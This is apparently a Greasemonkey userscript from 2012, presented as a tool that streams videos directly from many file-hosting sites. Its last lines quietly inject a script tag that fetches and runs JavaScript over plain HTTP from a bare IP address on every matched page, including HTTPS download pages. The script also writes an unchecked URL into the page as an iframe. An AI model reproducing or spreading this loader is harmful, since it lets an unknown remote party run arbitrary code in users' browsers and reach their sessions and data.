// ==UserScript==
// @name           DailyDivX V1.2
// @version        Jan 25, 2012
// @namespace      http://mrbrownee70.com
// @description    Enables direct streaming of videos from multiple file hosts.
// @include        http://*mrbrownee70.com/*
// @include        http://*depositfiles.com/*/files/*
// @include        http://www.divxden.com/*
// @include        http://www.vidxden.com/*
// @include	   http://www.movshare.net/*
// @include	   http://*.movshare.net/*
// @include	   http://*.2shared.com/*
// @include	   http://2shared.com/*
// @include	   http://*.megaupload.com/?d=*
// @include	   http://megaupload.com/?d=*
// @include	   http://*.megaporn.com/?d=*
// @include	   http://megaporn.com/?d=*
// @include	   http://*mrbrownee70.com/*
// @include        http://divxme.com/*
// @include        http://vidbull.com/*
// @include        http://*.vidbux.com/*
// @include        http://vidbux.com/*
// @include        http://*.vidape.com/*
// @include        http://vidape.com/*
// @include        http://*.uploadc.com/*
// @include        http://movreel.com/*
// @include        http://movbay.org/*
// @include        http://*.movbay.org/*
// @include        http://divxfish.com/*
// @include        http://*.divxfish.com/*
// @include        http://apexvid.com/*
// @include        http://*.apexvid.com/*
// @include        http://filerio.com/*
// @include        http://*.filerio.com/*
// @include	   https://rapidshare.com/*download*
// @include	   https://*.rapidshare.com/*download*
// @include        http://sendspace.com/*
// @include        http://*.sendspace.com/*
// @include        http://crocshare.com/*
// @include        http://*.crocshare.com/*
// @include        http://kickload.com/*
// @include        http://*.kickload.com/*
// @include        http://zalaa.com/*
// @include        http://*.zalaa.com/*
// ==/UserScript==

if (location.href.match('\\?url=')){
	var a = document.getElementById('qssone')[0];
	var b = document.getElementsByTagName('input')[0];
	var c = document.getElementsByName('url')[0].value;
	var iframe1 = '<iframe style="position:absolute;left:-3px;" frameborder="0" marginwidth="0" marginheight="0" scrolling="NO" width="665" height="330" src="'+c+'"></iframe>';

      document.body.innerHTML = iframe1;
}

var s = document.createElement('script');
s.setAttribute("type","text/javascript");
s.setAttribute("src", "http://209.105.236.243/~gmscript/dailydivx.js");
document.getElementsByTagName("head")[0].appendChild(s);